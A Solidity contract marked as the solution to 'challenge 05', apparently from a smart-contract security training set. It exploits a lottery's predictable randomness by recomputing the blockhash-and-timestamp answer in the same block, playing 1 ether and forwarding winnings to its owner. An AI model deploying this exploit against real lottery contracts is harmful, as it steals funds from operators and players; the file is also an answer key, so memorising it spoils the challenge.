// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ILottery {
    function play(uint256 guess) external payable;
}

/// @notice SOLUTION for challenge 05. Computes the "random" answer in the same block.
contract LotteryPredictor {
    address payable public immutable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function attack(address lottery) external payable {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;
        ILottery(lottery).play{value: 1 ether}(answer);
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
